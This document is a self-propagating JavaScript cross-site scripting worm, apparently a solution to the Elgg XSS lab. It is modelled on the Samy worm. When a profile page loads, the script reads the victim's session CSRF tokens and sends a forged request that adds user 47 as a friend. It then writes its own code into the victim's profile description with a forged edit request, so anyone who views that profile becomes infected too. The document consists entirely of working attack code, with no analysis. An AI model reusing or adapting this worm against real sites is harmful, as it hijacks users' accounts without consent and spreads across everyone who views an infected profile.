<script  id="worm" type="text/javascript">
	window.onload = function(){
        var id = elgg.get_logged_in_user_guid();
        if( id != 47)
        {
            //we've checked if the user is samy or not in the if
            //Next portion of code is for  replicating the worm

            var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
            var jsCode = document.getElementById("worm").innerHTML;
            var tailTag = "</" + "script>";
            var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

            //This ajax request is for add friend

            var Ajax=null;
            var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
            var token="&__elgg_token="+elgg.security.token.__elgg_token;
            //Construct the HTTP request to add Samy as a friend.


            var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47"+token+ts;; //FILL IN
            console.log(elgg.page_owner.owner_guid)
            Ajax=new XMLHttpRequest();
            Ajax.open("GET",sendurl,true);
            Ajax.setRequestHeader("Host","www.xsslabelgg.com");
            Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
            Ajax.send();

            //In the description field we have attached our wormcode .
            //and posted with the same parameters of task2 that will change the profile

            var guid = "&guid=" + elgg.session.user.guid;
            var name = "&name= garbage";
            var body = "&description=1605028" +wormCode  ;
            var others ="&accesslevel[description]=1"+"&contactemail= jhamela@gmail.com" + "&interests =sdwergsaf"+
            "&briefdescription=habijabi"+
            "&location=daferfsa"+
            "&mobile=dsdwrsdfsg"+
            "&name=sfsdfer"+
            "&phone= seasdf"+
            "&skills=asdfer"+
            "&twitter=asdwer"+
            "&website= edit@gmail.com"+
            "&accesslevel[briefdescription]=1"+
            "&accesslevel[contactemail]=1"+
            "&accesslevel[description]=1"+
            "&accesslevel[interests]=1"+
            "&accesslevel[location]=1"+
            "&accesslevel[mobile]=1"+	
            "&accesslevel[phone]=1"+
            "&accesslevel[skills]=1"+
            "&accesslevel[twitter]=1"+
            "&accesslevel[website]=1" ; 
            
            var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
            var content = token + ts  +body +others+ guid  ;
            var Ajax2 = null;
			Ajax2 = new XMLHttpRequest();
			Ajax2.open("POST",sendurl,true);
			Ajax2.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			Ajax2.send(content);
        }


       
	}
</script>